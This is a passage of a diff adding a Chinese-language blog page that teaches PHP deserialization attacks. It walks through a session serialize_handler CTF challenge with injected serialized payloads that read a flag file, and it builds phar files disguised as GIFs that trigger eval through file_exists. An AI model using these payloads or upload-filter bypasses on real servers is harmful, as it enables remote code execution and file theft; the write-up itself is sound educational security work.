+    class D0g3{
+    public $name = 'ghtwf01';
+    function __wakeup(){
+      echo &quot;Who are you?&quot;;
+    }
+    function __destruct(){
+      echo '&lt;br&gt;'.$this-&gt;name;
+    }
+  }
+  $str = new D0g3();
+  echo serialize($str);
+ ?&gt;
+</code></pre>
+<p>输出结果为</p>
+<figure data-type="image" tabindex="26"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144932-94f8e8a8-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144932-94f8e8a8-0518-1.png" alt="img" loading="lazy"></a></figure>
+<p>因为<code>session</code>是<code>php_serialize</code>处理器，所以允许<code>|</code>存在字符串中，所以将这段代码序列化内容前面加上<code>|</code>传入<code>session.php</code>中<br>
+现在来看一下存入<code>session</code>文件的内容</p>
+<figure data-type="image" tabindex="27"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144936-97555262-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144936-97555262-0518-1.png" alt="img" loading="lazy"></a></figure>
+<p>再打开<code>hello.php</code></p>
+<figure data-type="image" tabindex="28"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144941-9a2ff17c-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144941-9a2ff17c-0518-1.png" alt="img" loading="lazy"></a></figure>
+<h2 id="一道ctf题phpinfo">一道CTF题:PHPINFO</h2>
+<p>题目链接：http://web.jarvisoj.com:32784/<br>
+题目中给出如下代码</p>
+<pre><code>&lt;?php
+//A webshell is wait for you
+ini_set('session.serialize_handler', 'php');
+session_start();
+class OowoO
+{
+    public $mdzz;
+    function __construct()
+    {
+        $this-&gt;mdzz = 'phpinfo();';
+    }
+
+    function __destruct()
+    {
+        eval($this-&gt;mdzz);
+    }
+}
+if(isset($_GET['phpinfo']))
+{
+    $m = new OowoO();
+}
+else
+{
+    highlight_string(file_get_contents('index.php'));
+}
+?&gt;
+</code></pre>
+<p>仔细看了一遍发现题目没有入口，注意到<code>ini_set('session.serialize_handler', 'php')</code>，想到可不可能是<code>session</code>反序列化漏洞，看一下<code>phpinfo</code>,发现<code>session.serialize_handler</code>设置如下</p>
+<pre><code>local value(当前目录，会覆盖master value内容):php
+master value(主目录，php.ini里面的内容):php_serialize
+</code></pre>
+<p>这个很明显就存在<code>php session</code>反序列化漏洞，但是入口点在哪里，怎么控制<code>session</code>的值<br>
+在<code>phpinfo</code>里面看到了</p>
+<pre><code>session.upload_progress.enabled on
+session.upload_progress.cleanup off
+</code></pre>
+<p>当一个上传在处理中，同时<code>POST</code>一个与<code>INI</code>中设置的<code>session.upload_progress.name</code>同名变量时，当<code>PHP</code>检测到这种<code>POST</code>请求时，它会在<code>$_SESSION</code>中添加一组数据。所以可以通过<code>Session Upload Progress</code>来设置<code>session</code><br>
+允许上传且结束后不清除数据，这样更有利于利用<br>
+在<code>html</code>网页源代码上面添加如下代码</p>
+<pre><code>&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
+    &lt;input type=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+</code></pre>
+<figure data-type="image" tabindex="29"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144955-a28f8bca-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144955-a28f8bca-0518-1.png" alt="img" loading="lazy"></a></figure>
+<p>接下来考虑如何利用</p>
+<pre><code>&lt;?php
+ini_set('session.serialize_handler', 'php_serialize');
+session_start();
+class OowoO
+{
+    public $mdzz='print_r(scandir(dirname(__FILE__)));';
+}
+$obj = new OowoO();
+echo serialize($obj);
+?&gt;
+</code></pre>
+<p>得到</p>
+<figure data-type="image" tabindex="30"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145001-a60c44a0-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145001-a60c44a0-0518-1.png" alt="img" loading="lazy"></a></figure>
+<p>为了防止转义，在每个双引号前加上<code>\</code>，即</p>
+<pre><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;}
+</code></pre>
+<p>点击提交，<code>burpsuite</code>抓包将<code>filename</code>的值改为它</p>
+<figure data-type="image" tabindex="31"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145006-a8ff3988-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145006-a8ff3988-0518-1.png" alt="img" loading="lazy"></a></figure>
+<p>查询到当前目录有哪些文件了，在<code>phpinfo</code>里面查看到当前目录路径</p>
+<figure data-type="image" tabindex="32"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145010-abb3dd46-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145010-abb3dd46-0518-1.png" alt="img" loading="lazy"></a></figure>
+<p>于是我们利用</p>
+<pre><code>print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));
+</code></pre>
+<p>来读取<code>Here_1s_7he_fl4g_buT_You_Cannot_see.php</code>中的内容，同样的道理加上<code>\</code>后将<code>filename</code>改为</p>
+<pre><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}
+</code></pre>
+<p>得到<code>flag</code></p>
+<figure data-type="image" tabindex="33"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145016-aefb991c-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145016-aefb991c-0518-1.png" alt="img" loading="lazy"></a></figure>
+<h1 id="phar拓展反序列化攻击面">phar拓展反序列化攻击面</h1>
+<h2 id="phar文件简介">phar文件简介</h2>
+<h3 id="概念">概念</h3>
+<p>一个<code>php</code>应用程序往往是由多个文件构成的，如果能把他们集中为一个文件来分发和运行是很方便的，这样的列子有很多，比如在<code>window</code>操作系统上面的安装程序、一个<code>jquery</code>库等等，为了做到这点<code>php</code>采用了<code>phar</code>文档文件格式，这个概念源自<code>java</code>的<code>jar</code>，但是在设计时主要针对 PHP 的 Web 环境，与 <code>JAR</code> 归档不同的是<code>Phar</code>归档可由 <code>PHP</code> 本身处理，因此不需要使用额外的工具来创建或使用，使用<code>php</code>脚本就能创建或提取它。<code>phar</code>是一个合成词，由<code>PHP</code>和 <code>Archive</code>构成，可以看出它是<code>php</code>归档文件的意思(简单来说<code>phar</code>就是<code>php</code>压缩文档，不经过解压就能被 <code>php</code> 访问并执行)</p>
+<h3 id="phar组成结构">phar组成结构</h3>
+<pre><code>stub：它是phar的文件标识，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;;
+manifest：也就是meta-data，压缩文件的属性等信息，以序列化存储
+contents：压缩文件的内容
+signature：签名，放在文件末尾
+</code></pre>
+<p>这里有两个关键点，一是文件标识，必须以<code>__HALT_COMPILER();?&gt;</code>结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者其它文件来绕过一些上传限制；二是反序列化，<code>phar</code>存储的<code>meta-data</code>信息以序列化方式存储，当文件操作函数通过<code>phar://</code>伪协议解析<code>phar</code>文件时就会将数据反序列化，而这样的文件操作函数有很多</p>
+<h3 id="前提条件">前提条件</h3>
+<pre><code>php.ini中设置为phar.readonly=Off
+php version&gt;=5.3.0
+</code></pre>
+<h2 id="phar反序列化漏洞">phar反序列化漏洞</h2>
+<p>漏洞成因：<code>phar</code>存储的<code>meta-data</code>信息以序列化方式存储，当文件操作函数通过<code>phar://</code>伪协议解析<code>phar</code>文件时就会将数据反序列化</p>
+<h3 id="demo测试">demo测试</h3>
+<p>根据文件结构我们来自己构建一个<code>phar</code>文件，<code>php</code>内置了一个<code>Phar</code>类来处理相关操作</p>
+<pre><code>&lt;?php
+    class TestObject {
+    }
+
+    @unlink(&quot;phar.phar&quot;);
+    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+    $o = new TestObject();
+    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+    //签名自动计算
+    $phar-&gt;stopBuffering();
+?&gt;
+</code></pre>
+<p>可以很明显看到<code>manifest</code>是以序列化形式存储的</p>
+<figure data-type="image" tabindex="34"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145235-01d2d2fe-0519-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145235-01d2d2fe-0519-1.png" alt="img" loading="lazy"></a></figure>
+<p>有序列化数据必然会有反序列化操作，<code>php</code>一大部分的文件系统函数在通过<code>phar://</code>伪协议解析<code>phar</code>文件时，都会将<code>meta-data</code>进行反序列化<br>
+在网上扒了一张图</p>
+<figure data-type="image" tabindex="35"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145239-0436a1c4-0519-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145239-0436a1c4-0519-1.png" alt="img" loading="lazy"></a></figure>
+<p>用如下demo证明</p>
+<pre><code>&lt;?php 
+    class TestObject {
+        public function __destruct() {
+            echo 'hello ghtwf01';
+        }
+    }
+
+    $filename = 'phar://phar.phar/test.txt';
+    file_get_contents($filename); 
+?&gt;
+</code></pre>
+<figure data-type="image" tabindex="36"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145244-07779b54-0519-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145244-07779b54-0519-1.png" alt="img" loading="lazy"></a></figure>
+<p>当文件系统函数的参数可控时，我们可以在不调用<code>unserialize()</code>的情况下进行反序列化操作,极大的拓展了攻击面，其它函数也是可以的，比如<code>file_exists</code>函数,代码如下</p>
+<pre><code>&lt;?php 
+    class TestObject {
+        public function __destruct() {
+            echo 'hello ghtwf01';
+        }
+    }
+
+    $filename = 'phar://phar.phar/a_random_string';
+    file_exists($filename);
+ ?&gt;
+</code></pre>
+<figure data-type="image" tabindex="37"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145250-0ab8db34-0519-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145250-0ab8db34-0519-1.png" alt="img" loading="lazy"></a></figure>
+<h3 id="将phar伪造成其他格式的文件">将phar伪造成其他格式的文件</h3>
+<p>在前面分析<code>phar</code>的文件结构时可能会注意到，<code>php</code>识别<code>phar</code>文件是通过其文件头的<code>stub</code>，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将<code>phar</code>文件伪装成其他格式的文件</p>
+<pre><code>&lt;?php
+    class TestObject {
+    }
+
+    @unlink(&quot;phar.phar&quot;);
+    $phar = new Phar(&quot;phar.phar&quot;);
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头
+    $o = new TestObject();
+    $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+    //签名自动计算
+    $phar-&gt;stopBuffering();
+?&gt;
+</code></pre>
+<figure data-type="image" tabindex="38"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145254-0d4bc884-0519-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145254-0d4bc884-0519-1.png" alt="img" loading="lazy"></a></figure>
+<p>采用这种方法可以绕过很大一部分上传检测</p>
+<h4 id="利用条件">利用条件</h4>
+<pre><code>phar文件需要上传到服务器端
+要有可用的魔术方法作为“跳板”
+文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤
+</code></pre>
+<h4 id="漏洞复现">漏洞复现</h4>
+<p>upload.php<br>
+白名单只允许上传<code>jpg,png,gif</code></p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;文件上传&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+        &lt;input type=&quot;file&quot; name=&quot;pic&quot; /&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;上传&quot;/&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;?php
+    header(&quot;Content-type:text/html;charset=utf-8&quot;);
+    $ext_arr=array('.jpg','.png','.gif');
+    if(empty($_FILES)){
+        echo &quot;请上传文件&quot;;
+    }else{
+        define(&quot;PATH&quot;,dirname(__DIR__));
+        $path=PATH.&quot;/&quot;.&quot;upload&quot;.&quot;/&quot;.&quot;images&quot;;
+        $filetype=strrchr($_FILES[&quot;pic&quot;][&quot;name&quot;],&quot;.&quot;);
+        if(in_array($filetype,$ext_arr)){
+            move_uploaded_file($_FILES[&quot;pic&quot;][&quot;tmp_name&quot;],$path.&quot;/&quot;.$_FILES[&quot;pic&quot;][&quot;name&quot;]);
+            echo &quot;上传成功！&quot;;
+            }else{
+                    echo &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+            }
+
+        }
+?&gt;
+</code></pre>
+<p>file_exists.php<br>
+验证文件是否存在，漏洞利用点:<code>file_exists()</code>函数</p>
+<pre><code>&lt;?php
+$filename=$_GET['filename'];
+class ghtwf01{
+    public $a = 'echo exists;';
+    function __destruct()
+    {
+        eval($this -&gt; a);
+    }
+}
+file_exists($filename);
+?&gt;
+</code></pre>
+<p>构造phar文件</p>
+<pre><code>&lt;?php
+class ghtwf01{
+    public $a = 'phpinfo();';
+    function __destruct()
+    {
+        eval($this -&gt; a);
+    }
+}
+$phar = new Phar('phar.phar');
+$phar -&gt; stopBuffering();
+$phar -&gt; setStub('GIF89a'.'&lt;?php __HALT_COMPILER();?&gt;');
+$phar -&gt; addFromString('test.txt','test');
+$object = new ghtwf01();
+$phar -&gt; setMetadata($object);
+$phar -&gt; stopBuffering();
+?&gt;
+</code></pre>
+<p>改后缀名为<code>gif</code>，然后上传，最后在<code>file_exists.php</code>利用漏洞</p>
+<figure data-type="image" tabindex="39"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145302-1225f852-0519-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145302-1225f852-0519-1.png" alt="img" loading="lazy"></a></figure>
+<h1 id="参考链接">参考链接</h1>
+<p>https://www.freebuf.com/articles/web/206249.html<br>
+http://mini.eastday.com/mobile/190306223633207.html#<br>
+https://www.jianshu.com/p/54e93e92ba9e<br>
+https://www.jb51.net/article/79144.htm<br>
+https://xz.aliyun.com/t/6640<br>
+https://www.freebuf.com/vuls/202819.html<br>
+https://blog.csdn.net/u011474028/article/details/54973571<br>
+https://xz.aliyun.com/t/2715<br>
+<a href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://outlaws-bai.github.io/tag/g6GKCnb6O/" class="tag">
+                    knowledge-web
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://outlaws-bai.github.io/post/hello-gridea/">
+                  <h3 class="post-title">
+                    Hello Gridea
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
